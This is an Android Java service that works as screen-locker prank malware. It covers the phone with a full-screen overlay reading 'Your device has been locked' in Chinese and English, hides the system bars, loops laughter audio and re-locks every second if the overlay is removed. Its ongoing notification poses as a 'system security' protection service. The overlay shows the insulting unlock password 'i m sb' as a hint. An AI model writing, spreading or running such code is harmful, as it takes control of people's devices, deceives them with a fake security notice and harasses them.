package com.lockscreen.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.GradientDrawable;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.text.InputType;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.inputmethod.EditorInfo;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

public class LockScreenService extends Service {
    private static final String CHANNEL_ID = "lock_screen_channel";
    private static final String PASSWORD = "i m sb";

    private WindowManager windowManager;
    private View lockView;
    private TextView errorText;
    private int errorCount;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private MediaPlayer mediaPlayer;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(1, buildNotification());
        }
        showLockScreen();
        startAutoLockWatch();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (hasOverlayPermission() && lockView == null) {
            showLockScreen();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        stopAudio();
        removeLockScreen();
        super.onDestroy();
    }

    private void startAutoLockWatch() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                // Re-lock if view was removed or permission just granted
                if (hasOverlayPermission() && (lockView == null || lockView.getParent() == null)) {
                    lockView = null;
                    showLockScreen();
                }
                handler.postDelayed(this, 1000);
            }
        }, 1000);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean hasOverlayPermission() {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
    }

    private void showLockScreen() {
        if (windowManager == null || lockView != null) {
            return;
        }
        try {
            lockView = createLockView();
            // Hide status bar + nav bar
            lockView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                            : WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                            | WindowManager.LayoutParams.FLAG_FULLSCREEN
                            | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;
            params.x = 0;
            params.y = 0;
            windowManager.addView(lockView, params);
            startAudio();
        } catch (RuntimeException e) {
            lockView = null;
        }
    }

    private View createLockView() {
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.BLACK);

        // Content
        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER);
        content.setPadding(dp(32), 0, dp(32), 0);

        // Title - Chinese
        TextView titleCN = new TextView(this);
        titleCN.setText("你的设备已经被锁定");
        titleCN.setTextColor(Color.RED);
        titleCN.setTextSize(28);
        titleCN.setGravity(Gravity.CENTER);
        titleCN.setShadowLayer(4, 0, 0, Color.BLACK);
        content.addView(titleCN, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        // Spacer
        addSpacer(content, dp(6));

        // Title - English
        TextView titleEN = new TextView(this);
        titleEN.setText("Your device has been locked");
        titleEN.setTextColor(Color.RED);
        titleEN.setTextSize(20);
        titleEN.setGravity(Gravity.CENTER);
        titleEN.setShadowLayer(3, 0, 0, Color.BLACK);
        content.addView(titleEN, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        // Spacer
        addSpacer(content, dp(24));

        // Password input
        EditText input = new EditText(this);
        input.setHint("请输入密码");
        input.setHintTextColor(Color.GRAY);
        input.setTextColor(Color.WHITE);
        input.setTextSize(16);
        input.setGravity(Gravity.CENTER);
        input.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        input.setBackground(createEditBackground());
        input.setPadding(dp(16), dp(14), dp(16), dp(14));
        input.setImeOptions(EditorInfo.IME_ACTION_DONE);
        input.setOnEditorActionListener((v, actionId, event) -> {
            if (actionId == EditorInfo.IME_ACTION_DONE
                    || (event != null && event.getKeyCode() == KeyEvent.KEYCODE_ENTER)) {
                checkPassword(input);
                return true;
            }
            return false;
        });
        content.addView(input, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));

        // Spacer
        addSpacer(content, dp(12));

        // Error text (hidden by default)
        errorText = new TextView(this);
        errorText.setTextColor(Color.RED);
        errorText.setTextSize(16);
        errorText.setGravity(Gravity.CENTER);
        errorText.setVisibility(View.GONE);
        content.addView(errorText, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        // Spacer
        addSpacer(content, dp(8));

        // Hint text
        TextView hint = new TextView(this);
        hint.setText("密码是 i m sb");
        hint.setTextColor(Color.parseColor("#FF6666"));
        hint.setTextSize(14);
        hint.setGravity(Gravity.CENTER);
        content.addView(hint, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        // Spacer
        addSpacer(content, dp(16));

        // Bottom text
        TextView bottom = new TextView(this);
        bottom.setText("神秘小鸡踹倒android");
        bottom.setTextColor(Color.parseColor("#FF4444"));
        bottom.setTextSize(16);
        bottom.setGravity(Gravity.CENTER);
        content.addView(bottom, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));

        root.addView(content, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));

        return root;
    }

    private void checkPassword(EditText input) {
        if (PASSWORD.equals(input.getText().toString().trim())) {
            if (errorText != null) {
                errorText.setText("Password correct! Unlocking...");
                errorText.setTextColor(Color.GREEN);
                errorText.setVisibility(View.VISIBLE);
            }
            new Handler(Looper.getMainLooper()).postDelayed(this::unlock, 800);
        } else {
            errorCount++;
            if (errorText != null) {
                errorText.setText("密码错误! Wrong password! (" + errorCount + ")");
                errorText.setTextColor(Color.RED);
                errorText.setVisibility(View.VISIBLE);
            }
            input.setText("");
        }
    }

    private void unlock() {
        stopAudio();
        removeLockScreen();
        stopSelf();
    }

    private void startAudio() {
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.laughter);
            if (mediaPlayer != null) {
                mediaPlayer.setLooping(true);
                mediaPlayer.start();
            }
        } catch (Exception ignored) {}
    }

    private void stopAudio() {
        if (mediaPlayer != null) {
            try {
                if (mediaPlayer.isPlaying()) {
                    mediaPlayer.stop();
                }
                mediaPlayer.release();
            } catch (Exception ignored) {}
            mediaPlayer = null;
        }
    }

    private void removeLockScreen() {
        if (lockView != null && windowManager != null) {
            try {
                windowManager.removeView(lockView);
            } catch (RuntimeException ignored) {}
            lockView = null;
        }
    }

    private GradientDrawable createEditBackground() {
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#33FFFFFF"));
        bg.setCornerRadius(dp(8));
        bg.setStroke(dp(1), Color.RED);
        return bg;
    }

    private void addSpacer(LinearLayout parent, int height) {
        View spacer = new View(this);
        parent.addView(spacer, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, height));
    }

    private Notification buildNotification() {
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && manager != null) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "锁定屏幕服务",
                    NotificationManager.IMPORTANCE_LOW);
            manager.createNotificationChannel(channel);
        }

        Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, CHANNEL_ID)
                : new Notification.Builder(this);
        return builder
                .setContentTitle("系统安全")
                .setContentText("设备安全保护中")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .setOngoing(true)
                .build();
    }

    private int dp(int value) {
        return (int) (value * getResources().getDisplayMetrics().density + 0.5f);
    }
}
